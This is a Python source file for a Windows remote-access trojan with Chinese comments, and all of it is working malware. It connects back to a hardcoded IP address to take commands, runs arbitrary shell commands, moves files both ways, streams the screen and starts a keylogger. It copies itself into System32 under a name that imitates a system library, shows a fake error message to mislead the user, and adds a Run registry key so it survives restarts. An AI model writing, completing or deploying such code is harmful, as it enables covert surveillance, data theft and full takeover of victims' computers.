import socket,os,psutil,subprocess,threading
from multiprocessing import Process
from time import sleep
import win32gui
import win32ui
import win32con,sys
import numpy as np
import win32api,cv2,time
from PIL import ImageGrab
from io import BytesIO
import winreg

def screenshots():
    im = ImageGrab.grab()#无参数默认全屏截屏
    im.save('screenshot.jpeg',quality=40)

def get_process_pid(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            return proc.info['pid']
    return None
server_ip='113.45.181.202'
port=6369

def share_screen():

    p = ImageGrab.grab()#获得当前屏幕
    quality = 80  # 图像的质量
    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), quality]
    while True:
        im = ImageGrab.grab()
        imm=cv2.cvtColor(np.array(im), cv2.COLOR_RGB2BGR)#转为opencv的BGR格式
        imm = cv2.resize(imm, (1300, 900))#缩放
        img_encode = cv2.imencode(".jpg", imm, encode_param)[1]
        data_encode = np.array(img_encode)
        str_encode = data_encode.tostring()

        print("发生的数据大小",len(str_encode))
        #输入要发送的信息
        sendmsg="startsee"
        #yz_data=s.recv(1024)
        #print("line 40 yz_data is:",yz_data)
        #if yz_data==b"249see":
        #向服务器发送消息
            #print("验证通过发送数据一次")
        s.send(str_encode)
        time.sleep(0.5)
    print("see disconnect")


def key_lis():
    #print("im run ")
    subprocess.run(r"C:\Users\Administrator\Desktop\door\key_listen.exe")
def start_client(s):
    s.send(bytes("connect success", encoding="gbk"))
    while True:
        try:

            data = s.recv(1024)
            #print("第一段数据：",data)
            data = str(data, encoding="gbk")
            if len(data)<=0 or data=="\n" or data=="\r" or data=="":
                #print("empty data")
                data2="你发送了空数据"
                s.close()
                break
            if (data[0]=="ojbk"):
                data2="command success"
            elif (data[0]=="$"):
                data=data.replace("$","")
                data = subprocess.run(data,stdout=subprocess.PIPE,shell=True,encoding='gbk')
                #print(data.returncode)
                if data.returncode != 0:
                    data="命令输入错误"
                    s.send(bytes(data,encoding="gbk"))
                else:
                    #print(data.stdout)
                    s.send(bytes(data.stdout,encoding="gbk"))
            elif(data[0]=="@"):
                extend_func=data.replace("@","")
                extend_func=extend_func.split(" ",1)
                #print(extend_func)
                if extend_func[0]=="keylisten":
                    threading.Thread(target=key_lis).start()
                    s.send(bytes("ojbk", encoding="gbk"))
                if extend_func[0]=="del_keylisten": #会创建两个进程
                    os.kill(get_process_pid("key_listen.exe"),9)
                    os.kill(get_process_pid("key_listen.exe"),9)
                    s.send(bytes("ojbk", encoding="gbk"))
                if extend_func[0]=="upload":
                    s.send(bytes("ok", encoding="gbk"))
                    recv_file=data.replace("upload ","")
                    #print("will recv file<----"+recv_file)
                    recvd_size = 0 
                    file_name=os.path.basename(recv_file)
                    
                    #print("接受文件保存的路径是：","./"+file_name)
                    file_size=s.recv(1024)
                    #print("86行file_size的值是",file_size)
                    if file_size!=b"no_file":
                        fp = open("./"+file_name, 'ab')#ab追加 wb覆盖
                        if file_size.isdigit()==True:
                            file_size=int(file_size)
                            while not recvd_size == file_size:

                                #print("recv size:",file_size)
                                if file_size - recvd_size > 1024:
                                    data = s.recv(1024)
                                    recvd_size += len(data)
                                else:
                                    data = s.recv(file_size - recvd_size)
                                    recvd_size = file_size
                                fp.write(data)
                                #print(data)
                                s.send(bytes("up!up!", encoding="gbk"))  
                            fp.close()
                            s.send(bytes("success", encoding="gbk"))
                        s.send(bytes("command success", encoding="gbk"))
                if extend_func[0]=="recv":
                        send_file=data.replace("@recv ","")
                        #print("you try upload file--->"+send_file)
                        if os.path.isfile(send_file):
                            redat=s.recv(1024)
                            send_size=0
                            #print("recv file 返回数据：",redat)
                            if redat==b'startrecv':
                                #print("start send")
                                file_quality=int(os.stat(send_file).st_size)
                                #print("file size:",file_quality)
                                s.send(bytes(str(file_quality),encoding="gbk"))
                                #fp = open(send_file, 'rb')
                                with open(send_file,'rb') as f:
                                    # 按每一段分割文件上传
                                    for i in f:
                                        s.send(i)
                                        # 等待接收完成标志.
                                        #print("一段数据：\n\n")
                                        print(i)
                                        # 判断是否真正接收完成
                                        if s.recv(1024) == b'success':
                                            break
                            else:
                                print("target return other message")
                        else:
                            data2="文件不存在"
                            #print(data2)
                            s.send(bytes("no_file",encoding="gbk"))
                if extend_func[0]=="screenshots":
                    screenshots()
                    s.send(bytes("ojbk", encoding="gbk"))
                if extend_func[0]=="see":
                    share_screen()
            else:
                data = s.recv(1024)
                #print("132行返回的数据是：",data)
                s.send(bytes("命令结束", encoding="gbk"))


        except ConnectionResetError:
            #print("远程主机强迫关闭了一个现有的连接。ConnectionResetError")
            sleep(1)
            s.close()
            break
        except ConnectionRefusedError:
            
            #print("对方断开了连接。ConnectionRefusedError")
            sleep(1)
            s.close()
            break
        except ConnectionAbortedError:
            #print("你主动断开了连接。ConnectionAbortedError")
            sleep(1)
            s.close()
            break
        #except OSError:
        #    print("OSError: [WinError 10038] 在一个非套接字上尝试了一个操作。")
        #    sleep(1)
        #    s.close()
        #    break
        #except:data2="无效命令\n"
            sleep(1)
    #print("start_client退出循环一次")
main_exe="C:\\Windows\\System32\\msvcp249.exe"
try_start=0

def check_exe():
    for process in psutil.process_iter(['name']):
        if process.info['name'] == "msvcp249.exe":
            print(process.info['name'])
            return True
if check_exe()!=True:
            if os.path.isfile(main_exe):
                print("文件存在未运行，启动一次")
                os.system("start "+main_exe)
                #os.system(main_exe)

            else:
                win32api.MessageBox(0, "无法启动程序 不是有效的win32程序", "提醒", win32con.MB_OK)
                with open (sys.argv[0],'rb')as f:#自我复制
                    with open(main_exe,'ab') as target:
                        for i in f:
                            target.write(i)
                            #print("复制一次")
                            target.flush()
                os.system("start "+main_exe)
                #os.system(main_exe)
                print("文件部署成功，启动")
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",winreg.KEY_SET_VALUE, winreg.KEY_ALL_ACCESS|winreg.KEY_WRITE|winreg.KEY_CREATE_SUB_KEY)
                winreg.SetValueEx(key, "249", 0, winreg.REG_SZ, "C:\\Windows\\System32\\msvcp249.exe")
                winreg.CloseKey(key)
                sys.exit()
else:
    print("文件存在并且已经启动")
    while 1:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    #print("ret connect...")
                    s.connect((server_ip, port))
                    #print ("[+] new sect" , server_ip + ":", port)
                    start_client(s)
                    #start_new_thread(clientthread, (s,))
                    s.close()
                #except:
                except ConnectionRefusedError:
                        #print("对方断开了连接。ConnectionRefusedError")
                        sleep(1)
                        s.close()